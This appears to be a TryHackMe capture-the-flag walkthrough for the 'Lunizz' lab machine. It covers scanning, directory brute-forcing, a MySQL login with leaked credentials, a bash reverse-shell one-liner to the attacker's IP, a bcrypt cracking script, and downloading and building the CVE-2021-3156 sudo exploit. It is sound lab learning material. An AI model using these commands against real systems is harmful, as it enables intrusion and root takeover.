# [Lunizz CTF](https://tryhackme.com/room/lunizzctfnd)

> Lunizz CTF

## Scanning

scan the machine

```
nmap -A -T4 10.10.80.142
```

there are 4 open ports (80,3306,4444,5000)

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/8f7fa2d8-9129-4b16-8519-f47db0f21c66)

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/ee0f0de9-2ca6-4e20-a4f0-1f1fdbeeb792)

decode the message on port 4444, we have `extremesecurerootpassword` and `p@ssword`

try to connect with netcat

```
nc 10.10.80.142 4444
```

it seem root, but no...

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/755f517f-f044-4711-9f62-0fcf0b30c86c)

## HTTP

just a normal webpage

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/773cff2e-4d82-4278-b255-f09eac30fd56)

## Enumeration

bruteforce the directory

```
gobuster dir -u http://10.10.80.142/ -w /usr/share/wordlists/dirb/common.txt -t 30 -x php,txt
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/11fe8e44-0b87-4937-bce9-8149c7f76b33)

check the /hidden directory, it like a upload page

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/1640cc87-20a7-4e11-99f5-69ca1162a01c)

and /whatever directory, it like a command injection

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/f658b882-f052-49d3-9271-d5683c1841cb)

but all of above is not working

instructions.txt maybe more interested `runcheck:CTF_script_cave_changeme`

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/327e91d7-60b2-49d8-b4f9-641434041f7d)

## Exploitation

connect to mysql server

```
mysql -u runcheck -p -h 10.10.80.142
CTF_script_cave_changeme
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/4e2144f9-f03d-4142-aa4a-1976a7c43bab)

```
SHOW DATABASES;
use runornot;
SHOW TABLES;
SELECT * FROM runcheck;
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/54f25b16-a6ca-489d-8369-41f6d408bacd)

hey, what is run level? what is run on root? doesn't this related to what we just found above

```
UPDATE runcheck SET run = 1;
```

comeback /whatever folder, the run level change to 1

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/0d6edfc2-e1f7-4eab-b95f-a55e00f06521)

create a reverse shell

```
nc -vlnp 1234
````

```
/bin/bash -c "bash -i >& /dev/tcp/10.18.37.45/1234 0>&1"
```

cool, gain foothold

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/c6a5a855-1ee3-41b7-b931-3125f51bda7f)

upgrade shell

```
python3 -c "import pty;pty.spawn('/bin/bash')"
export SHELL=/bin/bash;export TERM=xterm-256color
Ctrl+Z
stty raw -echo; fg
```

```
ls -la /
```

i found a folder `proct` is owned by adam maybe interest

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/b5faf632-5435-41bc-b479-fa85373b11ca)

we have a subfolder pass and a python file inside

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/90ebe2f0-7ddb-4d1a-97d1-49e66767cf4c)

so crack the password of bcrypt

```
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash
```

but it's not work because the password is salted, you must crack by hand

```
#!/usr/bin/env python3

import bcrypt
import base64

salt = b'$2b$12$SVInH5XmuS3C7eQkmqa6UO'
bcrypt_hash = b'$2b$12$SVInH5XmuS3C7eQkmqa6UOM6sDIuumJPrvuiTr.Lbz3GCcUqdf.z6'

with open('/usr/share/wordlists/rockyou.txt', 'r', encoding='latin-1') as f:
	for word in f.readlines():
		passw = word.strip().encode('ascii', 'ignore')
		b64str = base64.b64encode(passw)
		hashAndSalt = bcrypt.hashpw(b64str, salt)
		print('\r', end='') # Clear previous line
		print(f'[*] Cracking hash: {hashAndSalt}', end='')

		if bcrypt_hash == hashAndSalt:
			print('\n[+] Cracked!')
			print(f'[+] Before hashed: {passw}')
			print(f'[+] After hashed: {hashAndSalt}')
			exit()
```

i said it will take you too long to get actual password... maybe more than 30 min for me :(

so, i found another approach at CVE-2021-3156

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/f00a1b03-9013-49ca-b99e-86e08dfb0bea)

```
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
python3 -m http.server
```

on target machine

```
cd /tmp
curl http://10.18.37.45:8000/exploit.c -o exploit.c
curl http://10.18.37.45:8000/shellcode.c -o shellcode.c
curl http://10.18.37.45:8000/Makefile -o Makefile
make
./exploit 0
```



| Flag | user.txt |
| --- | --- |
| Answer | <flag> |

## Privilege Escalation

.

| Flag | root.txt |
| --- | --- |
| Answer | <flag> |
